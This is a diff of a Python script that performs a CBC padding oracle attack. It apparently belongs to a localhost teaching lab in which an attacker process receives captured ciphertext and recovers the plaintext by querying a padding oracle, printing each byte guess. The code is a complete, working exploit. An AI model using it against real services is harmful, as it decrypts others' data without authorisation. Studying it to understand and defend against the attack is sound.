@@ -1,30 +1,28 @@
 #!/usr/bin/env python3
+"""
+Padding Oracle Attacker
+Run in Terminal 2. Receives ciphertext from the sender,
+then decrypts it using the CBC padding oracle attack.
+Prints each step: every byte guess that gets a 'valid' response from the oracle.
+"""
 
-import sys
 import threading
 import logging
 import time
 from flask import Flask, request, jsonify
 import requests as http_req
 
-# Force unbuffered stdout so progress shows immediately even when piped
-sys.stdout.reconfigure(line_buffering=True)
+# --- Hardcoded values ---
+BLOCK_SIZE = 16                        # AES block size: 16 bytes (128 bits)
+ORACLE_URL = "http://127.0.0.1:5000/oracle"
+LISTEN_PORT = 5001
 
-# ──────────────────────────────────────────────
-# HARDCODED / CONFIGURABLE VALUES
-# ──────────────────────────────────────────────
-BLOCK_SIZE    = 16     # AES block size = 128 bits, fixed by AES spec
-PADDING       = "PKCS#7"
-ORACLE_URL    = "http://127.0.0.1:5000/oracle"
-LISTEN_PORT   = 5001   # port to receive captured ciphertext
-# ──────────────────────────────────────────────
+# --- Flask app to receive ciphertext ---
+app = Flask(__name__)
+logging.getLogger("werkzeug").setLevel(logging.ERROR)
 
 captured_event = threading.Event()
 captured_ct = {"hex": None}
-
-app = Flask(__name__)
-log = logging.getLogger("werkzeug")
-log.setLevel(logging.ERROR)
 
 
 @app.route("/capture", methods=["POST"])
@@ -37,209 +35,161 @@ def capture():
     return jsonify({"status": "ok"})
 
 
-def start_flask():
-    app.run(host="127.0.0.1", port=LISTEN_PORT, threaded=True)
+# --- Helper functions ---
 
-
-# ──────────────────────────────────────────────
-# PADDING ORACLE ATTACK LOGIC
-# ──────────────────────────────────────────────
-
-def xor_bytes(a: bytes, b: bytes) -> bytes:
+def xor_bytes(a, b):
     return bytes(x ^ y for x, y in zip(a, b))
 
 
-def split_blocks(data: bytes) -> list[bytes]:
-    return [data[i : i + BLOCK_SIZE] for i in range(0, len(data), BLOCK_SIZE)]
+def split_blocks(data):
+    return [data[i:i+BLOCK_SIZE] for i in range(0, len(data), BLOCK_SIZE)]
 
 
-def oracle(two_blocks: bytes) -> bool:
-    """Ask the server: is the padding valid? (only gets True/False)"""
-    for attempt in range(3):
-        try:
-            resp = http_req.post(
-                ORACLE_URL, json={"ciphertext": two_blocks.hex()}, timeout=10
-            )
-            return resp.json().get("valid", False)
-        except Exception:
-            time.sleep(0.05)
-    return False
+def ask_oracle(two_blocks):
+    """Send 2 blocks to the server, get back True (padding valid) or False."""
+    try:
+        resp = http_req.post(ORACLE_URL, json={"ciphertext": two_blocks.hex()}, timeout=10)
+        return resp.json().get("valid", False)
+    except Exception:
+        return False
 
 
-def make_progress_bar(done: int, total: int, width: int = 30) -> str:
-    pct = done / total if total else 0
-    filled = int(width * pct)
-    bar = "#" * filled + "-" * (width - filled)
-    return f"[{bar}] {done}/{total} ({pct*100:.0f}%)"
+# --- The attack ---
 
-
-def p(msg=""):
-    """Print with immediate flush."""
-    print(msg, flush=True)
-
-
-def attack(ct_hex: str):
+def padding_oracle_attack(ct_hex):
     data = bytes.fromhex(ct_hex)
     blocks = split_blocks(data)
-    num_ct_blocks = len(blocks) - 1
-    total_bytes = num_ct_blocks * BLOCK_SIZE
-    queries = 0
-    start_time = time.time()
+    num_ct_blocks = len(blocks) - 1   # first block is the IV
 
-    p()
-    p("-" * 55)
-    p("  PADDING ORACLE ATTACK STARTED")
-    p("-" * 55)
-    p(f"  Ciphertext : {ct_hex[:48]}...")
-    p(f"  Total      : {len(data)} bytes = 1 IV + {num_ct_blocks} CT blocks")
-    p(f"  To recover : {total_bytes} bytes")
-    p(f"  Padding    : {PADDING}")
-    p(f"  Oracle     : {ORACLE_URL}")
-    p("-" * 55)
-    p()
+    print("\n" + "=" * 50)
+    print("  PADDING ORACLE ATTACK")
+    print("=" * 50)
+    print(f"  Ciphertext (hex) : {ct_hex}")
+    print(f"  Total length     : {len(data)} bytes")
+    print(f"  Block size       : {BLOCK_SIZE} bytes")
+    print(f"  Blocks           : 1 IV + {num_ct_blocks} ciphertext")
+    print(f"  Padding method   : PKCS#7")
+    print(f"  Oracle URL       : {ORACLE_URL}")
+    print("=" * 50)
 
-    # We'll build plaintext per-block, keeping proper left-to-right order
-    block_plaintexts = []  # list of bytearray, one per CT block
-    total_recovered = 0
+    query_count = 0
+    all_plaintext = b""
+    start = time.time()
 
-    for blk_idx in range(1, len(blocks)):
-        prev = blocks[blk_idx - 1]
-        target = blocks[blk_idx]
+    for blk_num in range(1, len(blocks)):
+        prev_block = blocks[blk_num - 1]
+        target_block = blocks[blk_num]
         intermediate = bytearray(BLOCK_SIZE)
-        this_block_bytes = bytearray(BLOCK_SIZE)
 
+        print(f"\n--- Block {blk_num} of {num_ct_blocks} ---")
+        print(f"  Previous block (hex): {prev_block.hex()}")
+        print(f"  Target block   (hex): {target_block.hex()}")
+
+        # recover each byte from right (position 15) to left (position 0)
         for byte_pos in range(BLOCK_SIZE - 1, -1, -1):
-            pad_val = BLOCK_SIZE - byte_pos
-            crafted = bytearray(BLOCK_SIZE)
+            target_padding = BLOCK_SIZE - byte_pos   # the padding value we want
 
+            # prepare the crafted block
+            crafted = bytearray(BLOCK_SIZE)
             for k in range(byte_pos + 1, BLOCK_SIZE):
-                crafted[k] = intermediate[k] ^ pad_val
+                crafted[k] = intermediate[k] ^ target_padding
 
             found = False
             for guess in range(256):
                 crafted[byte_pos] = guess
-                forged = bytes(crafted) + target
-                queries += 1
+                forged = bytes(crafted) + target_block
+                query_count += 1
+                valid = ask_oracle(forged)
 
-                if oracle(forged):
+                if valid:
+                    # for the last byte, confirm it is really 0x01 padding
                     if byte_pos == BLOCK_SIZE - 1:
                         check = bytearray(crafted)
                         check[byte_pos - 1] ^= 0x01
-                        queries += 1
-                        if not oracle(bytes(check) + target):
-                            continue
+                        query_count += 1
+                        if not ask_oracle(bytes(check) + target_block):
+                            continue   # false positive, keep trying
 
-                    intermediate[byte_pos] = guess ^ pad_val
-                    pt_byte = prev[byte_pos] ^ intermediate[byte_pos]
-                    this_block_bytes[byte_pos] = pt_byte
-                    total_recovered += 1
+                    intermediate[byte_pos] = guess ^ target_padding
+                    pt_byte = prev_block[byte_pos] ^ intermediate[byte_pos]
+                    char = chr(pt_byte) if 32 <= pt_byte < 127 else "."
 
-                    # Build the readable text so far (left-to-right, proper order)
-                    text_so_far = ""
-                    for prev_blk in block_plaintexts:
-                        for b in prev_blk:
-                            text_so_far += chr(b) if 32 <= b < 127 else "."
-                    for i in range(BLOCK_SIZE):
-                        if i < byte_pos:
-                            text_so_far += "?"
-                        else:
-                            b = this_block_bytes[i]
-                            text_so_far += chr(b) if 32 <= b < 127 else "."
-
-                    bar = make_progress_bar(total_recovered, total_bytes)
-                    sys.stdout.write(
-                        f"\r  {bar}  q={queries:<5d} "
-                        f'blk {blk_idx}/{num_ct_blocks}  '
-                        f'"{text_so_far}"  '
-                    )
-                    sys.stdout.flush()
-
+                    print(f"  Byte {BLOCK_SIZE - byte_pos:2d}/16 | "
+                          f"guess=0x{guess:02x} | "
+                          f"oracle=VALID | "
+                          f"intermediate=0x{intermediate[byte_pos]:02x} | "
+                          f"plaintext byte=0x{pt_byte:02x} ('{char}') | "
+                          f"queries so far={query_count}")
                     found = True
                     break
 
             if not found:
-                p(f"\n\n  [FAIL] Could not recover byte at block {blk_idx}, pos {byte_pos}")
+                print(f"  FAILED at byte position {byte_pos}")
                 return
 
-        pt_block = xor_bytes(prev, bytes(intermediate))
-        block_plaintexts.append(pt_block)
+        pt_block = xor_bytes(prev_block, bytes(intermediate))
+        all_plaintext += pt_block
+        print(f"  Block {blk_num} plaintext (hex): {pt_block.hex()}")
 
-    elapsed = time.time() - start_time
+    elapsed = time.time() - start
 
-    all_plain = b"".join(block_plaintexts)
-
-    p()
-    p()
-
-    # Strip PKCS#7 padding and show it
-    raw = all_plain
+    # strip PKCS#7 padding
+    raw = all_plaintext
     pad_byte = raw[-1]
     if 1 <= pad_byte <= BLOCK_SIZE and raw[-pad_byte:] == bytes([pad_byte] * pad_byte):
         plaintext = raw[:-pad_byte]
-        p(f"  PKCS#7 padding detected: last {pad_byte} bytes = 0x{pad_byte:02x}")
-        p(f"  Stripped {pad_byte} padding bytes")
+        print(f"\nPKCS#7 padding: last {pad_byte} byte(s) are 0x{pad_byte:02x}, stripped.")
     else:
         plaintext = raw
-        p("  [WARN] No valid PKCS#7 padding detected, returning raw bytes")
+        print(f"\nNo valid PKCS#7 padding found, returning raw bytes.")
 
     try:
         text = plaintext.decode()
     except UnicodeDecodeError:
         text = plaintext.hex()
 
-    p()
-    p("=" * 55)
-    p("  ATTACK COMPLETE")
-    p("=" * 55)
-    p(f"  Decrypted text  : {text}")
-    p(f"  Plaintext (hex) : {plaintext.hex()}")
-    p(f"  Bytes recovered : {total_recovered}")
-    p(f"  Oracle queries  : {queries}")
-    p(f"  Time taken      : {elapsed:.2f}s")
-    p("=" * 55)
-    p()
-
-
-def print_config():
-    p("=" * 55)
-    p("  MITM ATTACKER  (Padding Oracle Attack)")
-    p("=" * 55)
-    p()
-    p("  Hardcoded values:")
-    p(f"    Block size   : {BLOCK_SIZE} bytes ({BLOCK_SIZE * 8} bits)")
-    p(f"    Padding      : {PADDING}")
-    p(f"    Oracle URL   : {ORACLE_URL}")
-    p(f"    Listen port  : {LISTEN_PORT}")
-    p()
-    p("  The attacker does NOT know the key.")
-    p("  It only asks the oracle: 'is padding valid?' (yes/no)")
-    p("-" * 55)
-    p()
+    print("\n" + "=" * 50)
+    print("  RESULT")
+    print("=" * 50)
+    print(f"  Decrypted text : {text}")
+    print(f"  Hex            : {plaintext.hex()}")
+    print(f"  Total queries  : {query_count}")
+    print(f"  Time           : {elapsed:.2f}s")
+    print("=" * 50 + "\n")
 
 
 def main():
-    print_config()
+    # start flask in background
+    t = threading.Thread(
+        target=lambda: app.run(host="127.0.0.1", port=LISTEN_PORT, threaded=True),
+        daemon=True,
+    )
+    t.start()
 
-    flask_thread = threading.Thread(target=start_flask, daemon=True)
-    flask_thread.start()
-    p(f"  [OK] Listening for ciphertext on port {LISTEN_PORT}")
-    p("  Waiting for sender to send a message...\n")
+    print("=" * 50)
+    print("  ATTACKER — PADDING ORACLE")
+    print("=" * 50)
+    print(f"  Block size  : {BLOCK_SIZE} bytes")
+    print(f"  Padding     : PKCS#7")
+    print(f"  Oracle URL  : {ORACLE_URL}")
+    print(f"  Listening   : port {LISTEN_PORT}")
+    print("=" * 50)
+    print("\nWaiting for ciphertext from sender...\n")
 
     while True:
         captured_event.wait()
         captured_event.clear()
 
         ct_hex = captured_ct["hex"]
-        p(f"  [CAPTURED] Ciphertext received!")
-        p(f"  {ct_hex}")
+        print(f"Ciphertext received: {ct_hex}")
 
-        attack(ct_hex)
+        padding_oracle_attack(ct_hex)
 
-        p("  Waiting for next message...\n")
+        print("Waiting for next ciphertext...\n")
 
 
 if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        p("\n  Bye.")
+        print("\nBye.")
